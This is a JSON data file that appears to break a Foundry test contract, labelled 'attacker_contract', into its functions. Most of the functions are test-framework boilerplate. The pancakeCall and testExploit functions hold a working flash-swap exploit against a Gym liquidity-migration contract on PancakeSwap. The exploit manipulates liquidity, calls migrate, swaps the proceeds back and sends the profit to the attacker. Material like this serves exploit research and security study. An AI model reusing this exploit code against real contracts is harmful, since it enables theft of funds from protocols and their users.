[
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "IS_TEST",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeArtifacts",
    "original_code": "    function excludeArtifacts() public view returns (string[] memory excludedArtifacts_) {\n        excludedArtifacts_ = _excludedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeContracts",
    "original_code": "    function excludeContracts() public view returns (address[] memory excludedContracts_) {\n        excludedContracts_ = _excludedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeSenders",
    "original_code": "    function excludeSenders() public view returns (address[] memory excludedSenders_) {\n        excludedSenders_ = _excludedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "failed",
    "original_code": "    function failed() public view returns (bool) {\n        if (_failed) {\n            return _failed;\n        } else {\n            return vm.load(address(vm), bytes32(\"failed\")) != bytes32(0);\n        }\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "pancakeCall",
    "original_code": "    function pancakeCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data) public {\n        address[] memory path = new address[](2);\n        path[0] = address(wbnb);\n        path[1] = address(gym);\n        pancakeRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(\n            600e18, 0, path, address(this), type(uint32).max\n        );\n        pancakeRouter.addLiquidity(\n            address(wbnb),\n            address(gym),\n            wbnb.balanceOf(address(this)),\n            gymnet.balanceOf(address(liquidityMigrationV2)),\n            0,\n            0,\n            address(this),\n            type(uint32).max\n        );\n        liquidityMigrationV2.migrate(wbnbGymPair.balanceOf(address(this)));\n        pancakeRouter.removeLiquidityETHSupportingFeeOnTransferTokens(\n            address(gymnet), wbnbGymnetPair.balanceOf(address(this)), 0, 0, address(this), type(uint32).max\n        );\n        wbnb.deposit{value: address(this).balance}();\n        path[0] = address(gym);\n        path[1] = address(wbnb);\n        pancakeRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(\n            gym.balanceOf(address(this)), 0, path, address(this), type(uint32).max\n        );\n        path[0] = address(gymnet);\n        pancakeRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(\n            gymnet.balanceOf(address(this)), 0, path, address(this), type(uint32).max\n        );\n        wbnb.transfer(msg.sender, ((amount0 / 9975) * 10_000) + 10_000);\n        wbnb.transfer(tx.origin, wbnb.balanceOf(address(this)));\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetArtifactSelectors",
    "original_code": "    function targetArtifactSelectors() public view returns (FuzzSelector[] memory targetedArtifactSelectors_) {\n        targetedArtifactSelectors_ = _targetedArtifactSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetArtifacts",
    "original_code": "    function targetArtifacts() public view returns (string[] memory targetedArtifacts_) {\n        targetedArtifacts_ = _targetedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetContracts",
    "original_code": "    function targetContracts() public view returns (address[] memory targetedContracts_) {\n        targetedContracts_ = _targetedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetInterfaces",
    "original_code": "    function targetInterfaces() public view returns (FuzzInterface[] memory targetedInterfaces_) {\n        targetedInterfaces_ = _targetedInterfaces;\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetSelectors",
    "original_code": "    function targetSelectors() public view returns (FuzzSelector[] memory targetedSelectors_) {\n        targetedSelectors_ = _targetedSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetSenders",
    "original_code": "    function targetSenders() public view returns (address[] memory targetedSenders_) {\n        targetedSenders_ = _targetedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "testExploit",
    "original_code": "    function testExploit() public {\n        payable(address(0)).transfer(address(this).balance);\n        emit log_named_uint(\"Before exploit, USDC  balance of attacker:\", wbnb.balanceOf(msg.sender));\n        wbnbBusdPair.swap(2400e18, 0, address(this), new bytes(1));\n        emit log_named_uint(\"After exploit, USDC  balance of attacker:\", wbnb.balanceOf(msg.sender));\n    }\n\n",
    "description": ""
  }
]